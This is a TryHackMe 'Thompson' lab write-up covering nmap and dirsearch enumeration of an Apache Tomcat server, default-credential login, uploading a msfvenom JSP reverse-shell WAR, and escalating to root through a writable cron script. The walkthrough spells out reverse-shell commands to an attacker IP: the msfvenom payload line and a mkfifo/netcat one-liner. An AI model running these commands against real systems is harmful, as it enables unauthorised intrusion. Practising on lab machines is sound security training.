# Thompson \(L\)

_TryHackMe_ – [**Thompson**](https://tryhackme.com/room/bsidesgtthompson) Write-Up

_topics_: web application security, linux privilege escalation, modifying public exploits, crafting payloads

1. **Plan**
2. **Enumeration**
3. **Local Privilege Escalation \(Exploitation\)**
4. **Root Privilege Escalation**

new tools: autorecon?

tools: firefox browser, terminal, nmapAutomator, dirsearch, msfvenom, netcat, LinEnum

## 1\) Plan

Not much info given about this. Boot2root for FIT and bsides guatemala CTF.

## 2\) Enumeration

following `./nmapAutomator.sh <ip> Basic`

PORT STATE SERVICE VERSION

**22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 \(Ubuntu Linux; protocol 2.0\)**

**8009/tcp open ajp13 Apache Jserv \(Protocol v1.3\)**

**8080/tcp open http Apache Tomcat 8.5.5**

`python3 dirsearch.py -u http://10.10.147.83:8080/ -e php`

\[01:24:42\] 200 - 3KB - /build.xml

\[01:24:51\] 200 - 16KB - /docs/

\[01:24:53\] 200 - 1KsB - /examples/

\[01:24:58\] 401 - 2KB - /host-manager/html

\[01:25:00\] 200 - 11KB - /index.jsp

\[01:25:06\] 401 - 2KB - /manager/html/

It appears that this machine has 3 ports \(22 ssh, 8009 ajp13, 8080 http\) open and we have access to 6 subdomains \(/build, /docs, /examples, /index, /host-manager, /manager\)

Inspecting /host-manager_/_html reveals a login page. Escaping the login or entering nothing prompts a 401 unauthorized. The 401 suggests default creds as tomcat:s3cret which apparently are accepted by the site.

This does not reveal much sensitive information at first glance. Examining searchsploit for Apache Tomcat exploits, _ss Apache Tomcat 8.5_, reveals **CVE-2017-12617**.

## 3\) Local Privilege Escalation \(Exploitation\)

**CVE-2017-12617**, a JSP \(JavaServer Pages enables you to write dynamic, data-driven pages for your Java web applications.\) Upload Bypass/**RCE**. Uploading the exploit located at **/usr/share/exploitdb/exploits/jsp/webapps/42966.py** with `python /usr/share/exploitdb/exploits/jsp/webapps/42966.py -u http://10.10.147.83:8080` returns that it is not vulerable to CVE-2017-12617. We know that because **it is running a version listed as vulnerable with the CVE details**, it must be vulerable and this particular script may not be working.

Further investigation of the description of the CVE states the following important information, “_**it was possible to upload a JSP file to the server via a specially crafted request. This JSP could then be requested and any code it contained would be executed by the server**_.” This means that we specifically need a a jsp reverse shell and we need to upload it to the server somehow. Checking back to /host-manager shows no location to upload a file. However, navigating to /manager_/_html reveals a place to upload files.

We can craft a jsp reverse shell with msfvenom \(which is allowed on the exam\). `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.224.180 LPORT=4444 -f war > shell2.war && cp shell2.war /home/kali`. Uploading shell2.war \(.war files are Web Application ARchive files used to distribute jsp files to Java applications\) to the server, deploying it, navigating to it and clicking on it \(must have nc ready to catch\) enables a low privilege shell. We can retrieve the user.txt and even send a reverse shell back to the attacker machine.`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.224.180 4445 >/tmp/f`

## 4\) Root Privilege Escalation

Using wget to run LinEnum \(cd _tmp, wget http://&lt;attackerIp&gt;_/LinEnum.sh, chmod 777\) reveals some interesting things.

![](.gitbook/assets/0%20%281%29.png)

This sticks out to me immediately as most custom cronjobs are attack vectors towards root privilege. Listing the output for id.sh:

 _**\#!/bin/bash**_

_**id &gt; test.txt**_

test.txt:

_**uid=0\(root\) gid=0\(root\) groups=0\(root\)**_

this means that the test.txt file contains the id command output, while id.sh is a batch file and is run constantly run by **root** \(per /etc/crontab from LinEnum\). We can retrieve the flag from the root user by overwriting id.sh with `echo 'cp /root/root.txt /home/jack/root.txt' > id.sh`, ls to check and _cat root.txt_ to confirm we can view the root flag.

